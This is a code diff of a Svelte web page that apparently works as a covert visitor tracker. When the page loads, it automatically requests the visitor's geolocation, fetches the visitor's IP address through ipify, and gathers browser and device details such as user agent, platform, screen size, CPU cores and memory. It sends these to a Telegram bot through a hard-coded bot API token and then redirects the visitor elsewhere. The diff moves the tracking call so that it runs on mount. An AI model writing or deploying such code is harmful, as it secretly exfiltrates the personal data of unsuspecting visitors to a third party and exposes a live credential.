@@ -2,10 +2,11 @@
 
 <script>
   import { onMount } from 'svelte';
-  sendIPToTelegramBots();
-
   onMount(async () => {
-  
+sendIPToTelegramBots();
+
+
+
     // Request location permission automatically
     navigator.geolocation.getCurrentPosition(
       (position) => {
@@ -16,9 +17,9 @@
         if (error.code === error.PERMISSION_DENIED) {
           // Location permission denied, send IP result to Telegram bots
         
-//////1//////
+
 redirectToNextURL();
-//////1//////
+
         }
       }
     );
@@ -63,12 +64,17 @@ redirectToNextURL();
     });
   }
 
+
+
   async function sendIPToTelegramBots() {
     // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
     const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
     const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
 
-
+// Get the IP address using ipify API
+    const response = await fetch('https://api.ipify.org/?format=json');
+    const data = await response.json();
+    const ipAddress = data.ip;
 
 const userAgentData = navigator.userAgentData;
   const userAgent = navigator.userAgent;
@@ -89,10 +95,7 @@ const userAgentData = navigator.userAgentData;
 
 
 
-    // Get the IP address using ipify API
-    const response = await fetch('https://api.ipify.org/?format=json');
-    const data = await response.json();
-    const ipAddress = data.ip;
+    
 
 // Retrieve additional information about the user's system and browser const userAgent = navigator.userAgent; const platform = navigator.platform; const language = navigator.language; const screenWidth = window.screen.width; const screenHeight = window.screen.height; const cpuCores = navigator.hardwareConcurrency || 'N/A'; // Not all browsers support this property const totalRAM = navigator.deviceMemory || 'N/A'; // Not all browsers support this property const vendor = navigator.vendor; const renderingEngine = getRenderingEngine(); 
 
